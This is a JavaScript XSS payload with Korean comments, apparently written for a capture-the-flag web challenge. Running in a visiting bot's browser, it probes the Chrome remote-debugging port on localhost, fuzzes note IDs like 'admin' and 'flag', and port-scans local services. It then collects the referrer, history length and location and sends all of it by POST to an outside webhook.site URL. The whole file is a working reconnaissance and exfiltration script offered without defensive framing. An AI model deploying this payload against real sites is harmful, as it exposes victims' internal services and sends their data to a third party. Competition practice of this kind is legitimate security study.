(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 주소

    // 1. [핵심] Chrome Remote Debugging Port (9222) 확인
    let debuggerInfo = "Closed";
    try {
        const res = await fetch('http://127.0.0.1:9222/json');
        if (res.status === 200) {
            debuggerInfo = await res.text(); // 여기에 다른 탭 정보가 JSON으로 뜸
        }
    } catch (e) { debuggerInfo = "Connection Failed (Port 9222)"; }

    // 2. Referrer 확인 (봇이 어디서 왔는가)
    const referrer = document.referrer;

    // 3. 특수 노트 ID 찍어보기 (Fuzzing)
    const specialIds = ['0', '1', 'admin', 'flag', 'secret', 'test', 'note', 'private'];
    let foundSpecialNotes = {};
    for (const id of specialIds) {
        try {
            const res = await fetch(`/note/${id}`);
            if (res.status === 200) {
                foundSpecialNotes[id] = "FOUND! Check content manually if possible.";
                // 내용도 살짝 긁어오기
                const text = await res.text();
                if (text.includes("uoftctf")) foundSpecialNotes[id] += " [FLAG FOUND]";
            }
        } catch(e) {}
    }

    // 4. [재시도] 더 넓은 범위의 포트 스캔 + 타임아웃 증가 (3초)
    // 9222(Chrome), 9000(PhpFpm), 8080(Proxy), 3000(React/Node), 5001(Flask Alt)
    const ports = [9222, 8080, 8000, 3000, 5001, 8888, 80]; 
    let portScan = {};
    for (const port of ports) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 2000); // 2초 대기
            // no-cors로 찔러보기
            await fetch(`http://127.0.0.1:${port}/`, { mode: 'no-cors', signal: controller.signal });
            clearTimeout(timeout);
            portScan[port] = "OPEN";
            
            // OPEN이면 내용 읽기 시도
            try {
                const r = await fetch(`http://127.0.0.1:${port}/`);
                portScan[port + "_body"] = (await r.text()).substring(0, 200);
            } catch(err) { portScan[port + "_body"] = "CORS Blocked"; }

        } catch(e) { /* Closed */ }
    }

    // 5. history 개수 (봇이 이전에 다른 곳을 들렀는지)
    const historyLen = window.history.length;

    const data = {
        msg: "Last Resort Scan",
        chromeDebugger: debuggerInfo, // 9222 포트 결과 (가장 중요)
        referrer: referrer,           // 어디서 왔니
        specialNotes: foundSpecialNotes, // admin, flag 노트가 있니
        portScan: portScan,           // 포트 재확인
        historyLength: historyLen,
        location: window.location.href
    };

    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})();
